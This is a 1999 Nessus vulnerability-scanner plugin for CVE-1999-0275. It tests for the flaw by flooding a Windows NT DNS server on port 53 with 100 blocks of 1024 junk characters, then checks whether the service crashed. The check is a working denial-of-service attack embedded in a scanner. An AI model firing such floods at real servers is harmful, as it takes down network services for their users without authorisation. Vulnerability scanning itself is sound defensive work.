#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10312);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-1999-0275");
 
 name["english"] = "WindowsNT DNS flood denial";
 name["francais"] = "WindowNT DNS flood denial";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "We could make the
remote DNS server crash by flooding it
with characters. It must be the WindowsNT
DNS server.

Crashing the DNS server could allow
an attacker to make your network
non-functional, or even to use some
DNS spoofing techniques to gain
privileges on the network.

Solution : install the SP3.

Risk factor : High";


 desc["francais"] = "Il s'est avéré possible
de faire planter le serveur DNS distant en
l'inondant de caractères. Ca doit etre le
serveur DNS de WindowsNT.

Faire planter un serveur DNS va
permettre à des pirates de mettre
votre réseau à genoux, ou meme
d'utiliser des techniques de spoofing
DNS pour obtenir certains privilèges sur
le réseau.

Solution : installez le SP3.

Facteur de risque : Elevé";
 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote DNS server";
 summary["francais"] = "Fait planter le serveur DNS distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);	# ACT_FLOOD?
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(53);
 exit(0);
}

#
# The script code starts here
#

if(get_port_state(53))
{
 soc = open_sock_tcp(53);
 if(soc)
 {
  c = crap(1024);
  for(i=0;i<100;i=i+1)send(socket:soc, data:c);
  close(soc);
  soc2 = open_sock_tcp(53);
  if(!soc2)security_hole(53);
  else close(soc2);
 }
}
